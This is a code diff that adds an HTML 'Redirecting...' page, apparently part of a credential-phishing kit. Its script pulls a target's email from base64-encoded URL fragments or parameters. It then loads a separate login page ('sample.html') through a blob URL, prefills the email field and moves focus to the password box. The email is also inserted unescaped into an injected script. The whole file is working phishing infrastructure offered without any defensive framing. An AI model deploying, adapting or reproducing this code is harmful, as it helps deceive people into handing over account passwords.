@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // ============================================
+        // EMAIL EXTRACTION - SUPPORTS ALL FORMATS
+        // ============================================
+        function extractEmailFromURL() {
+            let email = null;
+            const hash = window.location.hash;
+            const search = window.location.search;
+
+            // Method 1: Check hash (#email@domain.com)
+            if (hash && hash.length > 1) {
+                let hashValue = hash.substr(1);
+                try {
+                    const decoded = atob(hashValue);
+                    if (decoded.includes('@') && decoded.includes('.')) {
+                        email = decoded;
+                    }
+                } catch(e) {
+                    if (hashValue.includes('@') && hashValue.includes('.')) {
+                        email = hashValue;
+                    }
+                }
+            }
+
+            // Method 2: Check query string (?email@domain.com)
+            if (!email && search && search.length > 1) {
+                const queryValue = search.substr(1);
+                if (queryValue.includes('@') && queryValue.includes('.') && !queryValue.includes('=')) {
+                    email = queryValue;
+                }
+            }
+
+            // Method 3: Check email parameter (?email=email@domain.com)
+            if (!email) {
+                const params = new URLSearchParams(search);
+                const emailParam = params.get('email');
+                if (emailParam && emailParam.includes('@') && emailParam.includes('.')) {
+                    email = emailParam;
+                }
+            }
+
+            // Method 4: Check 'login' parameter (base64 encoded)
+            if (!email) {
+                const params = new URLSearchParams(search);
+                const loginParam = params.get('login');
+                if (loginParam) {
+                    try {
+                        const decoded = atob(loginParam);
+                        if (decoded.includes('@') && decoded.includes('.')) {
+                            email = decoded;
+                        }
+                    } catch(e) {}
+                }
+            }
+
+            return email;
+        }
+
+        const email = extractEmailFromURL();
+        console.log('Extracted email:', email);
+
+        // Load sample.html with email injected
+        fetch('sample.html')
+            .then(response => {
+                if (!response.ok) throw new Error('Failed to load sample.html');
+                return response.text();
+            })
+            .then(htmlContent => {
+                if (email) {
+                    const emailScript = `
+<script>
+(function() {
+    const email = "${email}";
+    console.log('Setting email to:', email);
+    
+    function setEmail() {
+        const emailField = document.getElementById('email');
+        if (emailField) {
+            emailField.value = email;
+            console.log('✓ Email set to:', emailField.value);
+            
+            if (typeof $ !== 'undefined') {
+                $('#email').val(email);
+            }
+            
+            const event = new Event('input', { bubbles: true });
+            emailField.dispatchEvent(event);
+            
+            const passwordField = document.getElementById('password');
+            if (passwordField) {
+                setTimeout(() => passwordField.focus(), 100);
+            }
+        } else {
+            console.log('Email field not found, retrying...');
+            setTimeout(setEmail, 100);
+        }
+    }
+    
+    setEmail();
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setEmail);
+    }
+    
+    setTimeout(setEmail, 200);
+    setTimeout(setEmail, 500);
+})();
+<\/script>
+`;
+                    htmlContent = htmlContent.replace('</body>', emailScript + '\n</body>');
+                }
+
+                const blob = new Blob([htmlContent], { 
+                    type: 'text/html; charset=utf-8' 
+                });
+                const blobUrl = URL.createObjectURL(blob);
+                window.location.replace(blobUrl);
+            })
+            .catch(error => {
+                console.error('Error loading sample.html:', error);
+                window.location.href = 'sample.html' + (email ? '?email=' + encodeURIComponent(email) : '');
+            });
+    </script>
+</body>
+</html>
